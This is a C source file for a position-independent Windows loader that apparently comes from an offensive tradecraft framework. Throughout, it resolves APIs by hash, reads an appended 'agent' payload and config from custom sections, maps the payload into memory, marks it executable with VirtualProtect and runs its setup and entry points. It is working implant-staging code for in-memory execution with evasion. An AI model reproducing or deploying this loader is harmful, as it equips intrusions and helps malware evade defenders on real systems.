#include <windows.h>
#include "tcg.h"
 
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
 
FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}
 
#ifdef WIN_X86
__declspec ( noinline ) ULONG_PTR caller ( VOID ) { return ( ULONG_PTR ) WIN_GET_CALLER ( ); }
#endif
 
char __AGENT__  [ 0 ] __attribute__ ( ( section ( "agent" ) ) );
char __CONFIG__ [ 0 ] __attribute__ ( ( section ( "config" ) ) );

int __tag_setup_config ( );

typedef struct {
    int len;
    char val [ ];
} RESOURCE;

typedef void ( * AGENT_SETUP ) ( char * data, int len );

#define GET_RESOURCE(x) ( char * ) &x;
 
void go ( )
{
    char        * agent_src;
    char        * agent_code;
    char        * agent_data;
    RESOURCE    * config;
    IMPORTFUNCS   funcs;
    DWORD         old_protect;

    /* grab appended agent */
    agent_src = GET_RESOURCE ( __AGENT__ );
 
    /* allocate memory for code and data sections */
    agent_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( agent_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
    agent_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( agent_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );

    /* populate functions */
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    /* load into memory */
    PicoLoad ( &funcs, agent_src, agent_code, agent_data );

    /* flip code section to RX */
    KERNEL32$VirtualProtect ( agent_code, PicoCodeSize ( agent_src ), PAGE_EXECUTE_READ, &old_protect );

    /* grab appended config */
    config = ( RESOURCE * ) GET_RESOURCE ( __CONFIG__ );

    /* call setup export */
    ( ( AGENT_SETUP ) ( PicoGetExport ( agent_src, agent_code, __tag_setup_config ( ) ) ) ) ( config->val, config->len );

    /* call main entry point */
    PicoEntryPoint ( agent_src, agent_code ) ( ( char * ) &go );
}